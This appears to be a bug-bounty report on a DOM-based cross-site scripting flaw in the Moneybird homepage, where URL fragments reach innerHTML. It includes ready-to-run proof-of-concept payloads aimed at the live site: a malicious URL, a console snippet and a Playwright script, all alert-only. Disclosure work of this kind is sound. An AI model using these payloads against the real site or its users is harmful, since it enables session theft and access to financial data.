# DOM-Based Cross-Site Scripting (XSS) via URL Fragment

**Severity:** high | **CVSS:** 7 | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
**Platform:** HackerOne | **Program:** Moneybird
**Confidence:** high

## Description
The homepage directly writes URL fragment content into the DOM via innerHTML without sanitization. An attacker can craft a malicious URL containing an HTML/JS payload in the fragment (e.g., #<img src=x onerror=alert(1)>) and trick a user into clicking it, causing arbitrary JavaScript execution in the victim's browser.

## Steps to Reproduce
1. Navigate to: https://www.moneybird.com/#<img src=x onerror=alert("secbot-xss-37")>
2. Observe the alert dialog firing, confirming JavaScript execution
3. The payload reaches at least two separate innerHTML sinks on the page

## Impact
An attacker can steal session cookies, perform actions on behalf of the user, redirect to phishing pages, or exfiltrate sensitive financial data visible in the Moneybird UI. This is particularly severe for an accounting/finance application.

## Suggested Fix
Never assign unsanitized URL fragment data to innerHTML. Use textContent for plain text, or sanitize with DOMPurify before any HTML insertion. Audit all code paths that read from window.location.hash.

## Affected URLs
- https://www.moneybird.com/

## Reproduction

> **Note:** This is DOM-based XSS — URL fragments are never sent to the server, so curl cannot reproduce it. Use a browser.

**Browser PoC (copy URL, paste into address bar):**
```
https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
```

**JavaScript console verification (run on www.moneybird.com):**
```javascript
// Simulate the attack by setting location.hash and observing sinks
location.hash = '<img src=x onerror=console.log("XSS sink triggered: " + document.domain)>';
// If the console logs a message, the innerHTML sink is confirmed
```

**Automated PoC (Playwright):**
```javascript
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ headless: false });
  const page = await browser.newPage();
  // Listen for dialog (alert box fires = XSS confirmed)
  page.on('dialog', async dialog => {
    console.log('XSS CONFIRMED — dialog text:', dialog.message());
    await dialog.dismiss();
  });
  await page.goto('https://www.moneybird.com/#<img src=x onerror=alert("xss-confirmed")>');
  await page.waitForTimeout(3000);
  await browser.close();
})();
```
